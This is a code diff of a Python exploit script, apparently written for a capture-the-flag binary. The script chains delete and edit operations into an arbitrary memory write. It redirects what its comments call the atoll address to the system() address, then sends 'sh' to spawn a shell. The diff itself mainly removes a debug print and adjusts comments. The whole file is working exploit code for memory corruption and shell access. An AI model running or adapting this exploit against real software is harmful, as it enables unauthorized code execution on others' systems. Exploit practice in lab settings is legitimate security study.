@@ -5,7 +5,6 @@ def bhex(digit):
     digit = hex(digit)[2:]
     if(len(digit) & 1): #bitwise is odd
         digit = "0"+digit
-        print digit
     return binascii.unhexlify(digit)
 
 id = 1
@@ -42,22 +41,19 @@ for i in range(r):
     payload += dele(i,id)
 for i in range(r):
     payload += dele(i,nom)
-# that hex gonna have to be fetched from the output
-# use aff here to get input and calculate the correct adresses
 
-shift = 0
 old = 0x604840
 
 # id0pos = "\x60\x47\x88"[::-1]
 id0pos = bhex(0x604788)[::-1]
-where = bhex(0x602048)[::-1]
-what=bhex(0x7ffff7de9dd0)[::-1]
+where = bhex(0x602048)[::-1] #atoll adress
+what=bhex(0x7ffff7de9dd0)[::-1] #system adress, may change depending of your system
 # where="\x40\x0f\xc8"[::-1]
 
 payload += aff
 payload += edit(2,name,id0pos) # Name can only write 7 bit, overwrite name3 pointer to id0 location
 payload += edit(3,name,where) # Chose where id0 write
-payload += edit(0,id,what) # Arbitrary write x820 (can only write 7 bit)
+payload += edit(0,id,what) # Arbitrary write
 payload += "sh"
 
 print payload
